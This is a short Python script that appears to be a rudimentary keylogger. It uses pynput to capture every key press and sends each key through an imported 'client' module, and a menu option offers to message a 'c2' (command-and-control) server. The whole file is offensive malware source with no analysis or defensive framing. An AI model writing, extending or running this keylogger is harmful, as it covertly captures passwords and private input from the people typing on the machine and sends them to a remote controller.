import client
from pynput.keyboard import Key, Listener

def init():
    print("1 - Message c2")
    print("2 - log")
    menu = input()
    if menu == "1":
        while True:
            data = input("Send message: ")
            client.send(data)
            print("SUCCESS!")
    else:
        print("LOGGING ACTIVE")
        log()




def log():
    def on_press(key):
        client.send(str(key))
    with Listener(on_press=on_press) as listener:
        listener.join()


init()
